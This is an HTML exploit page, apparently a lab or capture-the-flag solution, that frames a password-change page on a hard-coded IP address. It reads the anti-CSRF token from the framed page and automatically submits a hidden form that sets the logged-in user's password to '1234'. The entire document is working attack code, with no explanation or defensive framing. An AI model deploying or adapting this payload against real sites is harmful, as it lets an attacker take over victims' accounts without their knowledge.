<html>
<body>
<iframe id="f" src="http://34.124.182.137/changepassword.php"></iframe>
<script>
document.getElementById('f').onload = function() {
    let token = this.contentDocument.querySelector('#csrftoken').value;

    let form = document.createElement('form');
    form.method = 'POST';
    form.action = 'http://34.124.182.137/save_profile.php';

    form.innerHTML = `
        <input type="hidden" name="password" value="1234">
        <input type="hidden" name="cpassword" value="1234">
        <input type="hidden" name="csrf_token" value="${token}">
    `;

    document.body.appendChild(form);
    form.submit();
};
</script>
</body>
</html>
